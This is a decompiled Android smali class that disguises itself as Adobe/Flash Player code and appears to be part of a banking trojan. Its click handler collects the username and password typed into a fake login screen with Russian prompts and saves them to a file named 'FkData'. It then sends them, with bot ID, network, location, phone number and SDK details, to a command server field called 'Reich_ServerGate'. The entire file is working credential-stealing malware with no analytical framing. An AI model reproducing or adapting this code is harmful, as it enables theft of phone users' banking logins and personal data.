.class Lcom/adobe/packages/SB$1;
.super Ljava/lang/Object;
.source "SB.java"

# interfaces
.implements Landroid/view/View$OnClickListener;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/adobe/packages/SB;->onCreate(Landroid/os/Bundle;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/adobe/packages/SB;

.field private final synthetic val$BotID:Ljava/lang/String;

.field private final synthetic val$BotLocation:Ljava/lang/String;

.field private final synthetic val$BotNetwork:Ljava/lang/String;

.field private final synthetic val$BotVer:Ljava/lang/String;

.field private final synthetic val$Pass:Landroid/widget/EditText;

.field private final synthetic val$Reich_ServerGate:Ljava/lang/String;

.field private final synthetic val$SDK:Ljava/lang/String;

.field private final synthetic val$User:Landroid/widget/EditText;

.field private final synthetic val$netInfo:Landroid/net/NetworkInfo;


# direct methods
.method constructor <init>(Lcom/adobe/packages/SB;Landroid/net/NetworkInfo;Landroid/widget/EditText;Landroid/widget/EditText;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    iput-object p2, p0, Lcom/adobe/packages/SB$1;->val$netInfo:Landroid/net/NetworkInfo;

    iput-object p3, p0, Lcom/adobe/packages/SB$1;->val$User:Landroid/widget/EditText;

    iput-object p4, p0, Lcom/adobe/packages/SB$1;->val$Pass:Landroid/widget/EditText;

    iput-object p5, p0, Lcom/adobe/packages/SB$1;->val$BotID:Ljava/lang/String;

    iput-object p6, p0, Lcom/adobe/packages/SB$1;->val$BotNetwork:Ljava/lang/String;

    iput-object p7, p0, Lcom/adobe/packages/SB$1;->val$BotLocation:Ljava/lang/String;

    iput-object p8, p0, Lcom/adobe/packages/SB$1;->val$BotVer:Ljava/lang/String;

    iput-object p9, p0, Lcom/adobe/packages/SB$1;->val$SDK:Ljava/lang/String;

    iput-object p10, p0, Lcom/adobe/packages/SB$1;->val$Reich_ServerGate:Ljava/lang/String;

    .line 57
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public onClick(Landroid/view/View;)V
    .locals 9
    .param p1, "v"    # Landroid/view/View;

    .prologue
    const/4 v3, 0x6

    const/4 v8, 0x1

    .line 59
    const/4 v0, 0x0

    .line 60
    .local v0, "t":Z
    iget-object v1, p0, Lcom/adobe/packages/SB$1;->val$netInfo:Landroid/net/NetworkInfo;

    if-eqz v1, :cond_2

    iget-object v1, p0, Lcom/adobe/packages/SB$1;->val$netInfo:Landroid/net/NetworkInfo;

    invoke-virtual {v1}, Landroid/net/NetworkInfo;->isConnectedOrConnecting()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 61
    const/4 v0, 0x0

    .line 68
    :goto_0
    iget-object v1, p0, Lcom/adobe/packages/SB$1;->val$User:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-interface {v1}, Landroid/text/Editable;->length()I

    move-result v1

    if-lt v1, v3, :cond_0

    iget-object v1, p0, Lcom/adobe/packages/SB$1;->val$Pass:Landroid/widget/EditText;

    invoke-virtual {v1}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v1

    invoke-interface {v1}, Landroid/text/Editable;->length()I

    move-result v1

    if-ge v1, v3, :cond_3

    .line 69
    :cond_0
    if-nez v0, :cond_1

    .line 70
    iget-object v1, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    invoke-virtual {v1}, Lcom/adobe/packages/SB;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "\u041f\u043e\u0436\u0430\u043b\u0443\u0439\u0441\u0442\u0430, \u043f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435 \u0432\u0432\u043e\u0434\u0438\u043c\u044b\u0435 \u0412\u0430\u043c\u0438 \u0434\u0430\u043d\u043d\u044b\u0435 \u0438 \u043f\u043e\u043f\u0440\u043e\u0431\u0443\u0439\u0442\u0435 \u0441\u043d\u043e\u0432\u0430."

    invoke-static {v1, v2, v8}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 71
    const/4 v0, 0x1

    .line 80
    :cond_1
    :goto_1
    return-void

    .line 64
    :cond_2
    const/4 v0, 0x1

    .line 65
    iget-object v1, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    invoke-virtual {v1}, Lcom/adobe/packages/SB;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    const-string v2, "\u041f\u0440\u043e\u0432\u0435\u0440\u044c\u0442\u0435 \u0441\u043e\u0435\u0434\u0438\u043d\u0435\u043d\u0438\u0435 \u0441 \u0438\u043d\u0442\u0435\u0440\u043d\u0435\u0442\u043e\u043c. \u041d\u0435\u0442 \u043e\u0442\u0432\u0435\u0442\u0430 \u043e\u0442 \u0441\u0435\u0440\u0432\u0435\u0440\u0430."

    invoke-static {v1, v2, v8}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    goto :goto_0

    .line 76
    :cond_3
    iget-object v1, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    const-string v2, "FkData"

    new-instance v3, Ljava/lang/StringBuilder;

    const-string v4, "Login: "

    invoke-direct {v3, v4}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v4, p0, Lcom/adobe/packages/SB$1;->val$User:Landroid/widget/EditText;

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\nPwd: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    iget-object v4, p0, Lcom/adobe/packages/SB$1;->val$Pass:Landroid/widget/EditText;

    invoke-virtual {v4}, Landroid/widget/EditText;->getText()Landroid/text/Editable;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v3

    const-string v4, "\nData: Sbr"

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    iget-object v4, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    invoke-virtual {v4}, Lcom/adobe/packages/SB;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-static {v1, v2, v3, v4}, Lcom/adobe/packages/SB;->access$0(Lcom/adobe/packages/SB;Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 77
    new-instance v1, Lcom/adobe/flashplayer_/AAA000;

    invoke-direct {v1}, Lcom/adobe/flashplayer_/AAA000;-><init>()V

    const/4 v2, 0x3

    new-array v2, v2, [Ljava/lang/String;

    const/4 v3, 0x0

    new-instance v4, Ljava/lang/StringBuilder;

    const-string v5, "&b="

    invoke-direct {v4, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lcom/adobe/packages/SB$1;->val$BotID:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "&c="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/adobe/packages/SB$1;->val$BotNetwork:Ljava/lang/String;

    const-string v6, ":"

    const-string v7, ""

    invoke-virtual {v5, v6, v7}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "&d="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/adobe/packages/SB$1;->val$BotLocation:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "&e="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    const-string v6, "BotPhone"

    iget-object v7, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    invoke-virtual {v7}, Lcom/adobe/packages/SB;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-static {v5, v6, v7}, Lcom/adobe/packages/SB;->access$1(Lcom/adobe/packages/SB;Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "&f="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/adobe/packages/SB$1;->val$BotVer:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "&g="

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    iget-object v5, p0, Lcom/adobe/packages/SB$1;->val$SDK:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    const-string v5, "&h=fkdata&i=bot"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    aput-object v4, v2, v3

    iget-object v3, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    const-string v4, "FkData"

    invoke-virtual {v3, v4}, Lcom/adobe/packages/SB;->getFileStreamPath(Ljava/lang/String;)Ljava/io/File;

    move-result-object v3

    invoke-virtual {v3}, Ljava/io/File;->toString()Ljava/lang/String;

    move-result-object v3

    aput-object v3, v2, v8

    const/4 v3, 0x2

    iget-object v4, p0, Lcom/adobe/packages/SB$1;->val$Reich_ServerGate:Ljava/lang/String;

    aput-object v4, v2, v3

    invoke-virtual {v1, v2}, Lcom/adobe/flashplayer_/AAA000;->execute([Ljava/lang/Object;)Landroid/os/AsyncTask;

    .line 78
    iget-object v1, p0, Lcom/adobe/packages/SB$1;->this$0:Lcom/adobe/packages/SB;

    invoke-virtual {v1}, Lcom/adobe/packages/SB;->finish()V

    goto/16 :goto_1
.end method
